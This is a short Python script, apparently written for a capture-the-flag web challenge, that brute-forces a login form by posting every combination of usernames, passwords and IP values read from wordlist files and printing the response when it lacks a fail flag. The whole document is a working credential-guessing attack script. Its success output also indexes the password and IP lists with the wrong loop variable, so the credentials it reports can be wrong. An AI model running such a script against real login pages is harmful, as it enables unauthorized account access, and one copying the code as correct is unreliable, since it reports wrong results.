import requests
f1=open("userLame.txt","r")
users=f1.readlines()
f2=open('pa$$w0rd.txt',"r")
pwds=f2.readlines()
f3=open('ip.txt','r')
ip_s=f3.readlines()
for x in range(len(users)):
	for y in range(len(pwds)):
		for z in range(len(ip_s)):
			r=requests.post("http://chal9.web.letspentest.org/login",data={'username':users[x].rstrip(),'password':pwds[y].rstrip(),'ip':ip_s[z].rstrip()})
			if not "FLAG{Not_True}" in r.text:
				print(r.text)
				print("Correct username: ",users[x].rstrip())
				print("Correct password: ",pwds[x].rstrip())
				print("Correct ip: ",ip_s[x].rstrip())
				break			
